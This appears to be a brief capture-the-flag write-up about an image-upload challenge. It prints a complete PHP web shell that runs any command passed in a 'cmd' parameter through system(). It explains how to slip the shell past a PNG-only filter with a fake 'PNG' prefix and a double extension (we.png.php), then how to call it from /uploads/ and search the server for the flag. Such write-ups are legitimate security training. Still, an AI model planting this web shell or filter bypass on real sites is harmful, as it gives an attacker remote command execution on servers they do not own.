The website only accepts png images
I found a php webshell code:
png // The server only checks the first few characters to be “PNG”, so I put them at the beginning of the code
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
save this code e.g we.png.php
choose the file and upload it
visit the upload site /uploads/we.png.php
Find the flag using find / -name *.txt
Then cat to output the flag
